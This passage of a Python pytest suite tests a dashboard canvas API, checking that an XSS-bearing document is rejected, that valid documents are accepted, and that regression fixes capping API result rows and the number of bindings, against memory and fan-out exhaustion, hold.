            f"/api/v1/canvases/{canvas_id}",
            json={"config": {"doc": xss_doc}},
            headers=_auth_headers(owner_id),
        )
        assert resp.status_code == 400, resp.text
        body = resp.json()
        # AppError serialises as {"error": {"code": ..., "message": ...}}
        error_code = body.get("code") or (body.get("error") or {}).get("code")
        assert error_code == "invalid_canvas_doc", body

    @pytest.mark.asyncio
    async def test_put_allows_valid_doc(self, canvas_client_with_viewer):
        """PUT /canvases/{id} accepts a config.doc that passes validation."""
        client, owner_id, *_ = canvas_client_with_viewer

        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        valid_doc = {
            "version": 1,
            "title": "Safe",
            "html": '<div><nubi-kpi data-el-id="el1"></nubi-kpi></div>',
            "bindings": {},
        }
        resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"config": {"doc": valid_doc}},
            headers=_auth_headers(owner_id),
        )
        assert resp.status_code == 200, resp.text


# ---------------------------------------------------------------------------
# 7. Regression: row-cap and binding-count caps (security findings)
# ---------------------------------------------------------------------------


class TestCanvasCapRegression:
    """Regression tests for the OOM row-cap and binding-count-cap fixes."""

    # ── 7a. API binding result is row-capped (HIGH OOM fix) ─────────────────

    @pytest.mark.asyncio
    async def test_api_binding_result_is_row_capped(self):
        """API/flow-provider binding: to_pylist() result is truncated to _ROW_CAP rows.

        Regression for the HIGH OOM finding: the api branch in collect_canvas_data
        previously called result_table.to_pylist() with NO row cap, unlike the
        query/metric branches which go through run_query_rows (which enforces
        _ROW_CAP).  The fix truncates rows_raw to _ROW_CAP after to_pylist().
        """
        import types

        from app.dashboards.collect import collect_canvas_data, _ROW_CAP  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="API OOM Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-value data-el-id="el_api"></nubi-value>',
                    "bindings": {
                        "el_api": {
                            "kind": "api",
                            "connector_id": "conn-xyz",
                            "path": "/data",
                        },
                    },
                }
            },
        )

        # Build a fake Arrow-like table with _ROW_CAP + 10 rows.
        over_cap = (_ROW_CAP if _ROW_CAP > 0 else 100_000) + 10
        fake_rows = [{"value": i} for i in range(over_cap)]

        class _FakeTable:
            schema = types.SimpleNamespace(names=["value"])

            def to_pylist(self):
                return list(fake_rows)

        class _FakeConnector:
            def execute(self, plan):
                return _FakeTable()

            def capabilities(self):
                return {}

            def close(self):
                pass

        fake_connector = _FakeConnector()

        with (
            patch(
                "app.dashboards.collect._resolve_connector",
                new=AsyncMock(return_value=(fake_connector, False)),
            ),
            patch(
                "app.connectors.plan",
                return_value=types.SimpleNamespace(rls_claims={}),
            ),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas["id"],
                org_id=org_id,
                claims={},
                repo=repo,
            )

        assert "el_api" in result
        entry = result["el_api"]
        assert "error" not in entry, f"Unexpected error: {entry.get('error')}"
        cap = _ROW_CAP if _ROW_CAP > 0 else 100_000
        assert len(entry["rows"]) == cap, (
            f"Expected rows truncated to {cap}, got {len(entry['rows'])}"
        )

    # ── 7b. Canvas with >500 bindings is rejected at parse (max_length=500) ─

    def test_canvas_doc_with_501_bindings_rejected_at_parse(self):
        """CanvasDoc.bindings has max_length=500; 501 entries must be rejected.

        Regression for the LOW resource finding: without max_length=500 on the
        Field, an attacker could craft a canvas doc with arbitrarily many bindings
        and force the server to spawn one coroutine per binding with no upper bound.
        """
        from pydantic import ValidationError  # noqa: PLC0415

        bindings = {
            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
            for i in range(501)
        }
        with pytest.raises(ValidationError) as exc_info:
            CanvasDoc.model_validate(
                {
                    "version": 1,
                    "title": "Too Many Bindings",
                    "html": "<div></div>",
                    "bindings": bindings,
                }
            )
        # Confirm the error is about the bindings dict length.
        err_str = str(exc_info.value)
        assert "bindings" in err_str.lower() or "500" in err_str, (
            f"Unexpected validation error: {err_str}"
        )

    def test_canvas_doc_with_exactly_500_bindings_accepted(self):
        """CanvasDoc.bindings accepts exactly 500 entries (boundary check)."""
        bindings = {
            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
            for i in range(500)
        }
        doc = CanvasDoc.model_validate(
            {
                "version": 1,
                "title": "Max Bindings",
                "html": "<div></div>",
                "bindings": bindings,
            }
        )
        assert len(doc.bindings) == 500

    # ── 7c. collect_canvas_data caps bindings at _MAX_CANVAS_BINDINGS ────────

    @pytest.mark.asyncio
    async def test_collect_caps_bindings_at_max_canvas_bindings(self):
        """collect_canvas_data truncates bindings to _MAX_CANVAS_BINDINGS before gather.

        Even if a raw canvas doc dict (bypassing Pydantic) somehow has >500
        bindings (e.g. legacy data), the collector must not fan-out more than
        _MAX_CANVAS_BINDINGS coroutines.
        """
        from app.dashboards.collect import collect_canvas_data, _MAX_CANVAS_BINDINGS  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        max_b = _MAX_CANVAS_BINDINGS if _MAX_CANVAS_BINDINGS > 0 else 500
        over_max = max_b + 5

        # Build raw bindings dict with over_max entries.
        raw_bindings = {
            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
            for i in range(over_max)
        }

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Oversized Bindings Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": "<div></div>",
                    "bindings": raw_bindings,
                }
            },
        )

        call_count = 0

        async def _mock_run_query_rows(query_id, org_id, repo, policies):
            nonlocal call_count
            call_count += 1
            return (["v"], [[call_count]])

        with patch(
            "app.dashboards.collect.run_query_rows",
            new=AsyncMock(side_effect=_mock_run_query_rows),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas["id"],
                org_id=org_id,
                claims={},
                repo=repo,
            )

        assert len(result) == max_b, (
            f"Expected at most {max_b} binding results, got {len(result)}"
        )
        assert call_count == max_b, (
            f"Expected exactly {max_b} run_query_rows calls, got {call_count}"
        )
